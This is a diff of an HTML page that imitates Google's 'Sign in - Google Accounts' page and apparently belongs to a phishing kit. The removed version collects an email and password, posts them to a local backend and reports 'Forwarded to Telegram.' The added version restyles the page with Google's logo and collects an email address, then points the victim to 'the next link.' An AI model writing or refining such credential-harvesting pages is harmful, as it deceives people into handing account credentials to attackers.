@@ -1,198 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fff;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            width: 380px;
-            box-sizing: border-box;
-        }
-        .logo {
-            font-family: 'Google Sans', Arial, sans-serif;
-            font-size: 24px;
-            font-weight: 500;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        .logo span:nth-child(1) { color: #4285F4; }
-        .logo span:nth-child(2) { color: #EA4335; }
-        .logo span:nth-child(3) { color: #FBBC05; }
-        .logo span:nth-child(4) { color: #4285F4; }
-        .logo span:nth-child(5) { color: #34A853; }
-        .logo span:nth-child(6) { color: #EA4335; }
-
-        h2 {
-            text-align: center;
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-top: 0;
-        }
-        p.subtitle {
-            text-align: center;
-            font-size: 16px;
-            color: #202124;
-            margin-bottom: 30px;
-        }
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border 0.2s;
-        }
-        input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-        .actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 30px;
-        }
-        a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
-        button {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #1b66c9;
-        }
-        #message {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in - Google Accounts</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
+<body class="bg-gray-50 font-sans min-h-screen flex items-center justify-center p-4">
 
-    <div class="card">
-        <div class="logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
-        <h2 id="heading-title">Sign in</h2>
-        <p class="subtitle" id="subtitle-text">with your Account to continue</p>
-        
-        <!-- Step 1: Email Input -->
-        <div id="step-email" class="input-group">
-            <input type="text" id="email" placeholder="Email or phone">
-        </div>
-
-        <!-- Step 2: Password Input (Hidden by default) -->
-        <div id="step-password" class="input-group" style="display: none;">
-            <input type="password" id="password" placeholder="Enter your password">
-        </div>
-
-        <div class="actions">
-            <a href="#" id="left-link">Create account</a>
-            <button id="next-btn" onclick="handleNext()">Next</button>
-        </div>
-
-        <div id="message"></div>
+  <!-- Main Card Wrapper -->
+  <div class="w-full max-w-[450px] bg-white border border-gray-200 rounded-3xl p-8 sm:p-10 shadow-sm flex flex-col items-center">
+    
+    <!-- Centered Google Logo -->
+    <div class="mb-6 flex justify-center items-center">
+      <svg class="w-16 h-16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+        <path d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.62z" fill="#FBBC05"/>
+        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+      </svg>
     </div>
 
-    <script>
-        let currentStep = 1;
-        let storedEmail = "";
+    <!-- Header Text -->
+    <div class="text-center mb-8 w-full">
+      <h1 class="text-2xl font-normal text-gray-900">Sign in</h1>
+      <p class="text-base text-gray-600 mt-2">to continue to your app</p>
+    </div>
 
-        async function handleNext() {
-            const messageDiv = document.getElementById("message");
+    <!-- Alert Message Box -->
+    <div id="message" class="hidden w-full mb-4 text-sm p-3 rounded-lg text-center font-medium"></div>
 
-            if (currentStep === 1) {
-                const emailInput = document.getElementById("email").value;
-                if (!emailInput) {
-                    messageDiv.style.color = "red";
-                    messageDiv.innerText = "Enter an email or phone number";
-                    return;
-                }
-                
-                // Save email and move to password step
-                storedEmail = emailInput;
-                messageDiv.innerText = "";
-                
-                document.getElementById("step-email").style.display = "none";
-                document.getElementById("step-password").style.display = "block";
-                document.getElementById("subtitle-text").innerText = storedEmail;
-                document.getElementById("left-link").innerText = "Forgot password?";
-                
-                currentStep = 2;
+    <!-- Form Container -->
+    <form id="email-form" onsubmit="handleEmailSubmit(event)" class="w-full space-y-6">
+      
+      <!-- Single Input Field for Email -->
+      <div class="w-full">
+        <div class="relative w-full">
+          <input 
+            type="email" 
+            id="email" 
+            required
+            class="peer w-full px-4 pt-5 pb-2 text-gray-900 bg-transparent border border-gray-400 rounded-lg focus:border-blue-600 focus:ring-1 focus:ring-blue-600 outline-none transition placeholder-transparent"
+            placeholder="Email address"
+          />
+          <label for="email" class="absolute left-4 top-3.5 text-gray-500 text-base transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-blue-600 pointer-events-none">
+            Email address
+          </label>
+        </div>
+      </div>
 
-            } else if (currentStep === 2) {
-                const passwordInput = document.getElementById("password").value;
-                if (!passwordInput) {
-                    messageDiv.style.color = "red";
-                    messageDiv.innerText = "Enter a password";
-                    return;
-                }
+      <!-- Action Links -->
+      <div class="text-sm">
+        <a href="#" class="text-blue-600 font-medium hover:underline">Forgot email?</a>
+      </div>
 
-                // Send both email and password to your FastAPI backend
-                try {
-                    const response = await fetch("http://127.0.0.1:8000/api/auth", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            email: storedEmail,
-                            password: passwordInput,
-                            action: "signup"
-                        })
-                    });
+      <!-- Footer Buttons -->
+      <div class="flex items-center justify-between pt-4">
+        <a href="#" class="text-sm text-blue-600 font-medium hover:underline">Create account</a>
+        <button 
+          type="submit" 
+          id="submit-btn"
+          class="bg-blue-600 hover:bg-blue-700 text-white font-medium px-6 py-2.5 rounded-full transition text-sm shadow-sm"
+        >
+          Submit
+        </button>
+      </div>
+    </form>
 
-                    const data = await response.json();
+  </div>
 
-                    if (response.ok) {
-                        messageDiv.style.color = "green";
-                        messageDiv.innerText = "Success! Forwarded to Telegram.";
-                    } else {
-                        messageDiv.style.color = "red";
-                        messageDiv.innerText = data.detail || "An error occurred.";
-                    }
-                } catch (error) {
-                    messageDiv.style.color = "red";
-                    messageDiv.innerText = "Could not connect to backend server.";
-                }
-            }
+  <script>
+    async function handleEmailSubmit(event) {
+      event.preventDefault();
+      const emailInput = document.getElementById("email").value.trim();
+      const messageDiv = document.getElementById("message");
+
+      if (!emailInput) {
+        messageDiv.className = "w-full mb-4 text-sm p-3 rounded-lg text-center font-medium bg-red-50 text-red-600";
+        messageDiv.innerText = "Please enter an email address.";
+        return;
+      }
+
+      try {
+        const response = await fetch("http://127.0.0.1:8000/api/auth", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            email: emailInput
+          })
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+          messageDiv.className = "w-full mb-4 text-sm p-3 rounded-lg text-center font-medium bg-green-50 text-green-600";
+          messageDiv.innerText = "You have to use this same email address to sign in into the next link ";
+          document.getElementById("email").value = ""; // Clear input field
+        } else {
+          messageDiv.className = "w-full mb-4 text-sm p-3 rounded-lg text-center font-medium bg-red-50 text-red-600";
+          messageDiv.innerText = data.detail || "An error occurred.";
         }
-    </script>
+      } catch (error) {
+        console.error("Connection error:", error);
+        messageDiv.className = "w-full mb-4 text-sm p-3 rounded-lg text-center font-medium bg-red-50 text-red-600";
+        messageDiv.innerText = "Could not connect to backend server. Make sure FastAPI is running.";
+      }
+    }
+  </script>
 
 </body>
 </html>
